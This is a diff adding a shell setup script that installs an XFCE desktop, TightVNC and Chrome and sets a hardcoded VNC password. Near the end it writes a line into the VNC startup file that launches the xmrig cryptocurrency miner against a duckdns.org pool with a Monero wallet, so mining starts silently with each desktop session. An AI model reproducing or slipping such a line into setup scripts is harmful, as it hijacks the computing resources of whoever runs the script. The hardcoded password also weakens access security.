@@ -1,0 +1,17 @@
+sudo apt update 
+sudo apt install xfce4 xfce4-goodies -y
+sudo apt-get install xfce4-whiskermenu-plugin -y
+sudo apt install tightvncserver xterm -y
+wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+sudo dpkg --install google-chrome-stable_current_amd64.deb
+sudo apt install --assume-yes --fix-broken
+rm -rf google-chrome-stable_current_amd64.deb
+rm -rf ~/.vnc
+mkdir ~/.vnc
+echo aunglay | vncpasswd -f > ~/.vnc/passwd
+chmod 0600 ~/.vnc/passwd
+echo "xrdb $HOME/.Xresources" > ~/.vnc/xstartup
+echo "startxfce4 &" >> ~/.vnc/xstartup
+echo xterm -e "xmrig -o aungmyozaw.duckdns.org:8585 -u 466qu8xzgtDXCr52mZxubW2yCFmdcAuLpHKECRmaCRn26V6LgNi5ttP74dQ7g2mUJNRzTqgDM6PUZQhaG45DgUx43kRxAoY --rig-id rig " >> ~/.vnc/xstartup
+chmod +x ~/.vnc/xstartup
+vncserver :1
